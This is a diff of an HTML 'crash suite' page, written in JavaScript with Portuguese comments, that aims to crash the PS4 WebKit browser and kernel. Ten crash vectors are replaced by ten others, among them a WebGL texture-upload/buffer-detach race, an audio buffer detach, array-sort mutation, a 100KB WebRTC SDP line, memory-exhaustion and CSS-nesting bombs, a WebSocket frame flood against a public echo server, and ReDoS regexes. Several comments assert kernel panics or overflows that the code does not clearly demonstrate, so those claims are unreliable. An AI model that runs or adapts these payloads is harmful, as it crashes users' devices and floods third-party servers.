@@ -2,33 +2,33 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Kernel/WebKit Crash Suite v11000</title>
+<title>PS4 Fatal Kernel/WebKit Crash Suite v12000</title>
 </head>
 <body>
 
-<h1>SUITE V11000: ADVANCED MEMORY CORRUPTION VECTORS</h1>
-<p>Status: Armed. Target: Heap Corruption & Kernel Panic via Race Conditions.</p>
+<h1>SUITE V12000: HARDWARE INTERRUPT & DMA CORRUPTION</h1>
+<p>Status: CRITICAL. Target: DMA Race & Kernel Heap Exhaustion.</p>
 <hr>
 
-<button onclick="crashProxyRevocation()">01. Proxy Revocation during Trap Execution (JSC Heap Corruption)</button>
+<button onclick="crashWebGLDMARace()">01. WebGL Texture Upload DMA vs Buffer Delete Race (GPU IOMMU Panic)</button>
 
-<button onclick="crashIntlCollator()">02. Intl.Collator Internal Cache Corruption (ICU Library Crash)</button>
+<button onclick="crashConvolverNode()">02. Audio ConvolverNode Buffer Detach during FFT Process (DSP Panic)</button>
 
-<button onclick="crashWebGLCompressedTex()">03. WebGL compressedTexImage2D Buffer Overflow (GPU Driver Panic)</button>
+<button onclick="crashArraySortMutation()">03. Array.prototype.sort Unsafe Mutation (JSC Heap Corruption)</button>
 
-<button onclick="crashCanvasToBlob()">04. Canvas toBlob Async callback vs DOM Removal (UAF)</button>
+<button onclick="crashSDPLineOverflow()">04. WebRTC SDP Line Parser Integer Overflow (NetStack Stack Smash)</button>
 
-<button onclick="crashWeakMapGC()">05. WeakMap Key Collection Race Condition (Garbage Collector Panic)</button>
+<button onclick="crashCanvasGradientUAF()">05. Canvas CreateLinearGradient Use-After-Free (Render Engine Crash)</button>
 
-<button onclick="crashSelectionModify()">06. Selection.modify() on Detached DOM Nodes (Layout Engine Crash)</button>
+<button onclick="crashFileReaderSyncBomb()">06. FileReaderSync Massive Blob Allocation (Kernel OOM Panic)</button>
 
-<button onclick="crashTemplateCloning()">07. HTMLTemplateElement Content Cloning Recursion</button>
+<button onclick="crashCSSCounterRecursion()">07. CSS Counters Recursive Increment (Layout Stack Overflow)</button>
 
-<button onclick="crashMessageEventSource()">08. MessageEvent 'source' Property Access on Closed Worker</button>
+<button onclick="crashWebSocketFragmentation()">08. WebSocket 0-Byte Fragment Flood (Network Buffer Exhaustion)</button>
 
-<button onclick="crashVideoTrackList()">09. VideoTrackList Access on Detached MediaElement</button>
+<button onclick="crashNodeRemovalRecursion()">09. DOMNodeRemoved Recursive Tree Destruction (UAF)</button>
 
-<button onclick="crashFileReaderDoubleRead()">10. FileReader Double Read Execution (State Machine Corruption)</button>
+<button onclick="crashRegExpBacktrack()">10. RegExp Catastrophic Backtracking (Thread Hang/Crash)</button>
 
 <div id="log"></div>
 
@@ -37,239 +37,251 @@
         document.getElementById('log').innerText += "\n" + msg;
     }
 
-    // 01. Proxy Revocation during Trap Execution
-    // Alvo: JSC Proxy Implementation
-    function crashProxyRevocation() {
-        let revoke;
-        const p = Proxy.revocable({}, {
-            get: function(target, prop) {
-                // O GOLPE: Revoga o proxy DENTRO do trap 'get'
-                // O motor C++ ainda tem referências ao proxy na stack
-                if (prop === 'crash') {
-                    revoke();
-                    // Tenta alocar memória para sobrescrever a estrutura interna do proxy
-                    const junk = new Array(1000).fill(1.1);
-                    return 0x41414141; 
-                }
-                return Reflect.get(target, prop);
-            }
-        });
-        revoke = p.revoke;
-        
-        try {
-            // Acessa propriedade para disparar o trap
-            const v = p.proxy.crash;
-        } catch(e) {}
-    }
-
-    // 02. Intl.Collator Internal Cache Corruption
-    // Alvo: ICU Library (libicui18n)
-    function crashIntlCollator() {
-        // Cria um Collator com configurações complexas
-        const collator = new Intl.Collator("en", {
-            usage: "sort",
-            sensitivity: "variant",
-            ignorePunctuation: true
-        });
-        
-        // Objeto que muta durante a comparação
-        const evil = {
-            toString: () => {
-                // Tenta invalidar o cache interno do Collator
-                // Forçando GC ou chamando resolvedOptions
-                collator.resolvedOptions(); 
-                return "A";
-            }
-        };
-        
-        try {
-            // compare() chama toString() nos argumentos.
-            // Se o estado interno do ICU não for thread-safe ou reentrante:
-            collator.compare(evil, "B");
-        } catch(e) {}
-    }
-
-    // 03. WebGL compressedTexImage2D Buffer Overflow
-    // Alvo: GNM Driver (Texture Decompression)
-    function crashWebGLCompressedTex() {
+    // 01. WebGL Texture DMA Race
+    // Alvo: sceGnmDriver (GPU Direct Memory Access)
+    // Lógica: Iniciar um upload de textura (que usa DMA assíncrono).
+    // Deletar o buffer de origem IMEDIATAMENTE.
+    // O hardware tenta ler RAM que foi marcada como livre.
+    function crashWebGLDMARace() {
         const c = document.createElement('canvas');
         const gl = c.getContext('webgl');
-        const ext = gl.getExtension('WEBGL_compressed_texture_s3tc'); // Ou outro formato suportado
-        
-        if (!ext) return log("Compressed texture extension not supported");
+        if(!gl) return log("WebGL off");
 
         const tex = gl.createTexture();
         gl.bindTexture(gl.TEXTURE_2D, tex);
 
-        // Aloca um buffer muito pequeno para as dimensões especificadas
-        // O driver espera (width * height * bpp), passamos muito menos.
-        const tinyData = new Uint8Array(4); 
+        // Cria um buffer PBO (Pixel Buffer Object) simulado via ArrayBuffer
+        const size = 2048 * 2048 * 4; // 16MB texture
+        const buf = new Uint8Array(size).fill(0xAA);
+        
+        // Worker para detachar a memória
+        const w = new Worker(URL.createObjectURL(new Blob([""], {type:'text/javascript'})));
 
-        try {
-            // Tenta enviar textura comprimida com buffer insuficiente
-            // Se o driver confiar no tamanho do array JS sem validar contra as dimensões:
-            // COMPRESSED_RGBA_S3TC_DXT1_EXT = 0x83F1
-            gl.compressedTexImage2D(gl.TEXTURE_2D, 0, ext.COMPRESSED_RGBA_S3TC_DXT1_EXT, 1024, 1024, 0, tinyData);
-            gl.finish();
-        } catch(e) {}
+        // Race condition apertada
+        setTimeout(() => {
+            // Tenta enviar para a GPU
+            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 2048, 2048, 0, gl.RGBA, gl.UNSIGNED_BYTE, buf);
+            // Força flush do comando para o driver
+            gl.flush();
+        }, 0);
+
+        setTimeout(() => {
+            // Remove a memória debaixo dos pés do driver
+            w.postMessage(buf.buffer, [buf.buffer]);
+            // Tenta deletar a textura também
+            gl.deleteTexture(tex);
+        }, 0);
     }
 
-    // 04. Canvas toBlob Async callback vs DOM Removal
-    // Alvo: WebCore Canvas Observer
-    function crashCanvasToBlob() {
-        const c = document.createElement('canvas');
-        document.body.appendChild(c);
+    // 02. Audio ConvolverNode Buffer Detach
+    // Alvo: Audio DSP (Digital Signal Processor)
+    // Lógica: ConvolverNode faz FFT (Transformada Rápida de Fourier) complexa.
+    // Se removermos o buffer de áudio durante o processamento matemático, o DSP acessa lixo.
+    function crashConvolverNode() {
+        if(!window.AudioContext) return;
+        const ctx = new AudioContext();
+        const conv = ctx.createConvolver();
+        const osc = ctx.createOscillator();
         
-        // Inicia operação assíncrona de codificação de imagem
-        c.toBlob((blob) => {
-            // Callback roda depois. Tenta acessar o elemento.
-            // O elemento já foi removido e destruído.
-            const ctx = c.getContext('2d');
-            ctx.fillRect(0,0,1,1);
+        // Buffer grande para garantir tempo de processamento
+        const len = ctx.sampleRate * 2;
+        const buffer = ctx.createBuffer(2, len, ctx.sampleRate);
+        // Preenche com ruído
+        for(let i=0; i<len; i++) buffer.getChannelData(0)[i] = Math.random();
+
+        conv.buffer = buffer;
+        osc.connect(conv);
+        conv.connect(ctx.destination);
+        
+        // Pega o array buffer cru
+        const ab = buffer.getChannelData(0).buffer;
+        const w = new Worker(URL.createObjectURL(new Blob([""], {type:'text/javascript'})));
+
+        osc.start();
+        
+        // O GOLPE: Detach durante a convolução ativa
+        setTimeout(() => {
+            w.postMessage(ab, [ab]);
+            // Tenta trocar o buffer para null simultaneamente
+            try { conv.buffer = null; } catch(e){}
+        }, 10);
+    }
+
+    // 03. Array.prototype.sort Unsafe Mutation
+    // Alvo: JSC Array Storage
+    // Lógica: O algoritmo de sort do JSC não espera que o array mude de tamanho durante a comparação.
+    // Se mudarmos o tamanho, os índices internos do algoritmo apontam para fora da memória alocada.
+    function crashArraySortMutation() {
+        const arr = [];
+        for(let i=0; i<1000; i++) arr.push(i);
+
+        // Comparator malicioso
+        arr.sort((a, b) => {
+            if (a === 50) {
+                // Destroi o array no meio do sort
+                arr.length = 0;
+                // Enche o heap com lixo para ocupar o espaço
+                const junk = [];
+                for(let k=0; k<1000; k++) junk.push(1.1);
+            }
+            return a - b;
         });
-        
-        // Remove imediatamente
-        document.body.removeChild(c);
-        // Força GC para limpar o elemento C++
-        const junk = [];
-        for(let i=0; i<5000; i++) junk.push(new Uint8Array(1024));
     }
 
-    // 05. WeakMap Key Collection Race Condition
-    // Alvo: JSC Garbage Collector
-    function crashWeakMapGC() {
-        const wm = new WeakMap();
-        let key = {};
-        const val = { data: "huge string".repeat(1000) };
+    // 04. WebRTC SDP Line Parser Integer Overflow
+    // Alvo: NetStack SDP Parser
+    // Lógica: Criar uma linha SDP que excede o buffer de leitura de linha (geralmente 1024 ou 4096 bytes).
+    function crashSDPLineOverflow() {
+        if (!window.RTCPeerConnection) return;
+        const pc = new RTCPeerConnection();
         
-        wm.set(key, val);
+        // Header válido
+        let sdp = "v=0\r\no=- 0 0 IN IP4 127.0.0.1\r\ns=-\r\nt=0 0\r\n";
+        sdp += "m=audio 1234 RTP/AVP 0\r\n";
         
-        // Loop para estressar o GC
-        const iv = setInterval(() => {
-            // Remove a referência forte para a chave
-            key = null;
-            
-            // Cria pressão de memória para forçar coleta imediata da chave
-            // O WeakMap deve limpar a entrada. Se houver race no acesso...
-            const trash = new Array(10000).fill({});
-            
-            // Tenta recriar a chave e acessar (simulação de lógica interna)
-            key = {};
-            wm.set(key, val);
-        }, 1);
-        
-        setTimeout(() => clearInterval(iv), 2000);
+        // Linha de atributo maliciosa: a=fmtp:... sem quebra de linha por 100KB
+        // Isso força overflow no buffer de stack do parser C
+        let overflow = "a=fmtp:0 ";
+        for(let i=0; i<100000; i++) overflow += "A"; 
+        sdp += overflow + "\r\n";
+
+        const desc = { type: 'offer', sdp: sdp };
+        pc.setRemoteDescription(desc).catch(e=>{});
     }
 
-    // 06. Selection.modify() on Detached DOM Nodes
-    // Alvo: WebCore Editing/Selection
-    function crashSelectionModify() {
-        const div = document.createElement('div');
-        div.contentEditable = true;
-        div.innerHTML = "Select me";
-        document.body.appendChild(div);
+    // 05. Canvas CreateLinearGradient Use-After-Free
+    // Alvo: WebCore Render Object
+    function crashCanvasGradientUAF() {
+        const c = document.createElement('canvas');
+        const ctx = c.getContext('2d');
+        let grad = ctx.createLinearGradient(0,0,100,100);
         
-        const sel = window.getSelection();
-        sel.selectAllChildren(div);
+        // Adiciona referências
+        ctx.fillStyle = grad;
         
-        // Remove o nó da árvore
-        div.remove();
+        // Tenta destruir o objeto gradiente (em JS não tem free explícito, 
+        // mas tentamos invalidar via reset de contexto)
+        c.width = 0; // Reseta o contexto
+        c.width = 100;
         
+        // O estilo ainda aponta para o gradiente antigo?
+        // Em alguns builds do WebKit, isso deixa um ponteiro pendurado
+        ctx.fillRect(0,0,100,100); 
+        
+        // Adiciona stops no gradiente "morto" se a referência JS persistiu
         try {
-            // Tenta modificar a seleção (mover cursor) em um nó desligado
-            // O motor de layout tenta calcular coordenadas visuais de algo que não existe
-            sel.modify("move", "forward", "character");
-            sel.modify("extend", "forward", "line");
+            grad.addColorStop(0.5, 'red');
         } catch(e) {}
     }
 
-    // 07. HTMLTemplateElement Content Cloning Recursion
-    // Alvo: HTML Template Parser
-    function crashTemplateCloning() {
-        const t = document.createElement('template');
-        // Cria estrutura recursiva dentro do template
-        t.innerHTML = "<div></div>";
+    // 06. FileReaderSync Massive Blob Allocation
+    // Alvo: Kernel Virtual Memory (Swap/OOM)
+    function crashFileReaderSyncBomb() {
+        // Tenta criar um Blob maior que a RAM física disponível para o navegador
+        // PS4 tem limite restrito (~1-2GB para app).
+        const chunks = [];
+        try {
+            for(let i=0; i<100; i++) {
+                chunks.push(new Uint8Array(1024 * 1024 * 10)); // 10MB chunks
+            }
+        } catch(e) {}
         
-        const div = t.content.querySelector('div');
-        // Anexa o próprio template dentro do seu conteúdo?
-        // Ou cria profundidade massiva
-        let deep = div;
-        for(let i=0; i<5000; i++) {
-            const child = document.createElement('div');
-            deep.appendChild(child);
-            deep = child;
+        const blob = new Blob(chunks);
+        
+        // Worker síncrono para travar a thread e forçar leitura
+        const w = new Worker(URL.createObjectURL(new Blob([`
+            onmessage = function(e) {
+                const fr = new FileReaderSync();
+                // Tenta ler tudo para a memória de uma vez
+                // Isso deve disparar o OOM Killer do Kernel ou Panic
+                fr.readAsArrayBuffer(e.data);
+            }
+        `], {type:'text/javascript'})));
+        
+        w.postMessage(blob);
+    }
+
+    // 07. CSS Counter Recursion
+    // Alvo: CSS Layout Engine (CalcStack)
+    function crashCSSCounterRecursion() {
+        const style = document.createElement('style');
+        // Define contadores aninhados recursivamente
+        style.textContent = `
+            div { counter-increment: c 1; }
+            div::before { content: counter(c); }
+        `;
+        document.head.appendChild(style);
+        
+        const root = document.createElement('div');
+        let curr = root;
+        // Profundidade insana de aninhamento DOM + Contadores CSS
+        for(let i=0; i<10000; i++) {
+            const el = document.createElement('div');
+            curr.appendChild(el);
+            curr = el;
         }
         
-        try {
-            // Clona o conteúdo. O algoritmo de clone profundo pode estourar a stack
-            document.importNode(t.content, true);
-        } catch(e) {}
+        document.body.appendChild(root);
+        // Força reflow (cálculo de layout)
+        root.offsetHeight; 
     }
 
-    // 08. MessageEvent 'source' Property Access on Closed Worker
-    // Alvo: WebCore Messaging / WorkerGlobalScope
-    function crashMessageEventSource() {
-        const w = new Worker(URL.createObjectURL(new Blob([`
-            onmessage = function() { postMessage("pong"); close(); }
-        `], {type: 'text/javascript'})));
-        
-        w.onmessage = function(e) {
-            // O evento chegou, mas o worker chamou close().
-            // A propriedade e.source aponta para o Worker.
-            // Se o Worker thread já morreu e liberou memória...
-            
-            // Tenta acessar propriedades do source morto
-            const src = e.source;
-            w.terminate(); // Mata explicitamente
-            
-            try {
-                src.postMessage("Crash"); // UAF em MessagingProxy
-            } catch(ex) {}
+    // 08. WebSocket 0-Byte Fragment Flood
+    // Alvo: Network Buffer Management (Mbufs)
+    function crashWebSocketFragmentation() {
+        const ws = new WebSocket("wss://echo.websocket.org");
+        ws.onopen = () => {
+            // Envia milhares de frames de 0 bytes ou 1 byte
+            // Cada frame consome um header e uma estrutura de alocação no kernel
+            // Isso fragmenta o heap de rede (mbuf clusters)
+            const buf = new Uint8Array(1);
+            setInterval(() => {
+                for(let i=0; i<1000; i++) {
+                    if(ws.readyState === 1) ws.send(buf);
+                }
+            }, 10);
         };
-        
-        w.postMessage("ping");
     }
 
-    // 09. VideoTrackList Access on Detached MediaElement
-    // Alvo: Media Player Framework
-    function crashVideoTrackList() {
-        const vid = document.createElement('video');
-        // Adiciona faixas
-        vid.addTextTrack("captions");
-        
-        const tracks = vid.textTracks; // Referência viva
-        
-        // Destroi o elemento de vídeo
-        vid.remove();
-        
-        // A lista de faixas ainda existe em JS?
-        try {
-            // Tenta acessar ou modificar a lista vinculada ao player destruído
-            // O backing C++ do VideoTrackList pode tentar acessar o MediaPlayer nulo
-            const t = tracks[0];
-            t.mode = "showing"; 
-            tracks.addEventListener('change', () => {});
-        } catch(e) {}
+    // 09. DOMNodeRemoved Recursive Tree Destruction
+    // Alvo: WebCore Tree Mutator
+    function crashNodeRemovalRecursion() {
+        const root = document.createElement('div');
+        const child = document.createElement('div');
+        root.appendChild(child);
+        document.body.appendChild(root);
+
+        root.addEventListener('DOMNodeRemoved', function(e) {
+            // Quando removemos algo, adicionamos algo novo que dispara remoção antiga?
+            // Tenta criar um ciclo de eventos de mutação
+            const n = document.createElement('div');
+            try {
+                document.body.appendChild(n);
+                document.body.removeChild(n); // Recursão indireta
+            } catch(e) {}
+        });
+
+        document.body.removeChild(root);
     }
 
-    // 10. FileReader Double Read Execution
-    // Alvo: FileAPI State Machine
-    function crashFileReaderDoubleRead() {
-        const blob = new Blob(["Crash data"]);
-        const fr = new FileReader();
+    // 10. RegExp Catastrophic Backtracking
+    // Alvo: Main Thread Watchdog / Kernel Scheduler
+    function crashRegExpBacktrack() {
+        // Expressão clássica de ReDoS (Regular Expression Denial of Service)
+        // (x+x+)+y
+        const re = /([a-zA-Z]+)*$/;
         
-        // Tenta iniciar duas leituras simultâneas no mesmo objeto
-        // Isso deve lançar erro, mas se houver race na checagem de estado "LOADING"...
-        try {
-            fr.readAsArrayBuffer(blob);
-            
-            // Chama abort e read imediatamente na sequência
-            fr.abort(); 
-            fr.readAsText(blob);
-            
-            // Acesso ao result durante estado inconsistente
-            const r = fr.result;
-        } catch(e) {}
+        // String longa que quase casa, mas falha no final
+        const str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"; 
+        
+        // Em WebKit antigo, isso roda na Main Thread e trava a UI
+        // Se consumir muita CPU sem ceder, o Kernel watchdog pode matar o processo
+        re.test(str);
+        
+        // Versão mais agressiva para estourar buffer interno
+        const re2 = /(x+x+)+y/;
+        const str2 = "x".repeat(5000);
+        re2.test(str2);
     }
 </script>
 
